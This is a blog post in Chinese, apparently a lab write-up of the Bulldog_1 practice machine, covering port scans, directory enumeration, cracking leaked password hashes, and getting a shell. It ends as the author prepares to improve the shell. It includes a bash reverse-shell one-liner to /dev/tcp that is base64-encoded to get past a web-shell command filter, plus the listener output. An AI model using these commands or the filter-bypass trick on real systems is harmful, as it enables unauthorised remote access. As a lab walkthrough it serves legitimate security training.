@@ -1,0 +1,783 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Bulldog_1 靶机信息收集12345678910111213┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.123Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-02 23:49 EDTNmap scan report for 192.168.56.123Ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bulldog_1 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/57098f1aa06f.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Bulldog_1 靶机信息收集12345678910111213┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.123Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-02 23:49 EDTNmap scan report for 192.168.56.123Ho">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/31494dcd9babc79f5099992bed51edde_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c61cff90c1dad4f47d787d64a3f6a484_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a0a69b13836033d8755fffa92f05f1d4_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/cc8579ececf613f0e2d658038bf7746e_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/212092fea2c922f66fd14c4469802e9f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b61417fadb8c3083b49431a857d12d5e_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/49f2ccc7082fe7c2f115256696e7682e_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/845bc5b3f4839aa992a598a86d3c3a29_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/cc73d1c9c1e38394ad29a9340fcb90c9_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2ff3d029daefbf132405c3b63366e414_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0fb2d933d6055be7bb26f1a8eb271641_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/8ca00b968be6098658a4b9188a9e85b1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2dc0ea36b2cc64e82d17d6dc9ebf2019_MD5.png">
+<meta property="article:published_time" content="2023-07-03T12:56:32.000Z">
+<meta property="article:modified_time" content="2023-07-04T02:17:36.087Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/31494dcd9babc79f5099992bed51edde_MD5.png">
+  
+  
+  
+  <title>Bulldog_1 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Bulldog_1 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-03 20:56" pubdate>
+          2023年7月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          183 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bulldog_1 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Bulldog-1-靶机"><a href="#Bulldog-1-靶机" class="headerlink" title="Bulldog_1 靶机"></a>Bulldog_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.123<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 23:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00028s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>23/tcp   open  telnet<br>80/tcp   open  http<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.70 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.123<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 02:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00032s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  open|filtered nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.48 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 23,80,8080 端口，DUP 端口扫描结果没有特别需要注意的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p23,80,8080 192.168.56.123               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 23:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00035s latency).<br><br>PORT     STATE SERVICE VERSION<br>23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:8b:<span class="hljs-built_in">fc</span>:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)<br>|   256 <span class="hljs-built_in">cd</span>:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)<br>|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)<br>80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)<br>|_http-title: Bulldog Industries<br>8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)<br>|_http-title: Bulldog Industries<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.33 seconds<br></code></pre></td></tr></table></figure>
+
+<p>这里可以判断出 23 端口是 ssh 端口，80 和 8080 端口似乎网页标题和搭建方式都是相同的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sudo nmap --script=vuln -p23,80,8080 192.168.56.123<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 01:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00035s latency).<br><br>PORT     STATE SERVICE<br>23/tcp   open  telnet<br>80/tcp   open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-fileupload-exploiter: </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn\&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|_  /dev/: Potentially interesting folder</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-enum: <br>|   /robots.txt: Robots file<br>|_  /dev/: Potentially interesting folder<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br><br></code></pre></td></tr></table></figure>
+
+<p>看到 80 和 8080 端口枚举的结果也是相同的</p>
+<h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p>接下来先只看 80 端口进行网页查看</p>
+<p><img src="/pic/31494dcd9babc79f5099992bed51edde_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>80 端口的网页中，网站建立者说明了一件事：遭受了攻击，给了个公开说明的链接</p>
+<p><img src="/pic/c61cff90c1dad4f47d787d64a3f6a484_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>说明中透漏了一些信息：黑客通过 shell 连接后使用脏牛漏洞进行提权，和一个用户名 <code>Churchy</code>。之前 nmap 枚举出了一些目录或者文件，进行查看，同时开启 dirsearch 目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sudo dirsearch -u http://192.168.56.123        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.123/_23-07-03_01-45-30.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-03_01-45-30.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.123/<br><br>[01:45:30] Starting: <br>[01:45:37] 301 -    0B  - /admin  -&gt;  http://192.168.56.123/admin/          <br>[01:45:37] 302 -    0B  - /admin/  -&gt;  http://192.168.56.123/admin/login/?next=/admin/<br>[01:45:37] 302 -    0B  - /admin/?/login  -&gt;  http://192.168.56.123/admin/login/?next=/admin/%3F/login<br>[01:45:38] 301 -    0B  - /admin/login  -&gt;  http://192.168.56.123/admin/login/<br>[01:45:46] 301 -    0B  - /dev  -&gt;  http://192.168.56.123/dev/              <br>[01:45:46] 200 -    3KB - /dev/                                             <br>[01:45:58] 200 -    1KB - /robots.txt                                  <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/a0a69b13836033d8755fffa92f05f1d4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>robots.txt 中是个黑客攻破后留下的团队的标志，那 dev 目录呢</p>
+<p><img src="/pic/cc8579ececf613f0e2d658038bf7746e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>给了更详细的信息，归纳一下：这应该是开发者团队对新员工的说明和培训，PHP 被移除了服务器，不会用流行度很高的 cms 和管理工具，而是用自己开发的工具。有个 webshell 的接口以后会取代 ssh 连接，MongoDB 还没有被安装好，公司买了个新的入侵检测系统，还给了个 webshell 的链接</p>
+<p><img src="/pic/212092fea2c922f66fd14c4469802e9f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>点进去提示没有经过验证，看一看开发团队网页的源代码</p>
+<p><img src="/pic/b61417fadb8c3083b49431a857d12d5e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>哈希值竟然直接写在了里面，使用在线工具破解吧</p>
+<p><img src="/pic/49f2ccc7082fe7c2f115256696e7682e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/pic/845bc5b3f4839aa992a598a86d3c3a29_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>有两个用户的密码碰撞了出来，<code>sarah:bulldoglover</code> 和 <code>nick:bulldog</code> 尝试 ssh 登录但是失败。</p>
+<blockquote>
+<p>实际上这里我一开始只使用控制台看了一眼折叠起来的源码，没有直接查看网页源代码，所以在这里卡了很久，针对下方的登录界面尝试了一些 Django 的漏洞，包括 <a target="_blank" rel="noopener" href="https://github.com/HxDDD/CVE-PoC/tree/main/Django">CVE-PoC&#x2F;Django at main · HxDDD&#x2F;CVE-PoC · GitHub</a> 中的三个，但是都没有成功。所以使用 burp suite 的 Cluster bomb 模式来爆破，用户名就是刚才页面里邮箱的用户名，密码使用的是 burp suite 的默认密码列表，得到了 <code>nick:bulldog</code> 这样一对登录凭证</p>
+</blockquote>
+<p><img src="/pic/cc73d1c9c1e38394ad29a9340fcb90c9_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>回到目录扫描的结果，其中有登录的 URL</p>
+<p><img src="/pic/2ff3d029daefbf132405c3b63366e414_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试用上面两个用户进行登录，nick:bulldog 登录成功，但是界面却提示没有权限编辑任何东西</p>
+<p><img src="/pic/0fb2d933d6055be7bb26f1a8eb271641_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>那这里似乎突破口不是很明显，回到&#x2F;dev 目录看看呢，竟然有了个 webshell 的界面</p>
+<p><img src="/pic/8ca00b968be6098658a4b9188a9e85b1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="编码-Getshell"><a href="#编码-Getshell" class="headerlink" title="编码 Getshell"></a>编码 Getshell</h3><p>尝试了一下，发现有简单的过滤，whoami,bash 等命令被过滤了，那就 base64 编码后再执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/443 0&gt;&amp;1&quot;&#x27;</span> |<span class="hljs-built_in">base64</span><br>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQ0MyAwPiYx<br>          <br>┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQ0MyAwPiYxIgo=&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>/bin/bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/443 0&gt;&amp;1&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>根据上方结果，构造出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQ0MyAwPiYxIgo=&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure>
+
+<p>提前开启监听，然后再网页中执行</p>
+<p><img src="/pic/2dc0ea36b2cc64e82d17d6dc9ebf2019_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.123] 48748<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (976): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>bash: /root/.bashrc: Permission denied<br>django@bulldog:/home/django/bulldog<span class="hljs-variable">$whoami</span><br><span class="hljs-built_in">whoami</span><br>django<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(django) gid=1001(django) <span class="hljs-built_in">groups</span>=1001(django),27(sudo)<br>django@bulldog:/home/django/bulldog$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:07:ae:20 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.123/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe07:ae20/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux bulldog 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+
+<p>确定目标反弹成功，并且知道了内核版本号，接下来完善一下 shell</p>
